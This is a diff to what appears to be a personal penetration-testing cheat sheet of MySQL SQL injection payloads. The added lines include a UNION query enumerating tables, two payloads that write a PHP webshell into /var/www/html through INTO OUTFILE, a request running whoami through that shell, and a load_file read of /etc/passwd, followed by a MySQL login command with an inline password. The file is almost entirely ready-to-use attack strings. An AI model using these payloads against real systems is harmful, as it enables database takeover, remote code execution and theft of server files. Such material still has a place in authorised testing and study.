@@ -25,10 +25,19 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 ##############
 ####### MySQL
 ##############
+
+Show tables:
+' UNION select NULL,NULL,NULL,table_schema,table_name,NULL FROM information_Schema.tables;#
+
 RCE:
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //
 $ Write webshell.php inside server
-webshell.php?cmd=whoami
+' UNION ALL SELECT NULL,NULL,NULL,NULL,"<?php system($_GET['cmd']);?>",NULL INTO OUTFILE "/var/www/html/webshell.php"#
+$ Another way to do the same
+GET webshell.php?cmd=whoami
+
+Read Files:
+' UNION ALL SELECT NULL,NULL,NULL,NULL,load_file("/etc/passwd"),NULL#
 
 mysql -u dbadmin -p'dbpass' -h 10.0.0.1 -P 3306
 select version();
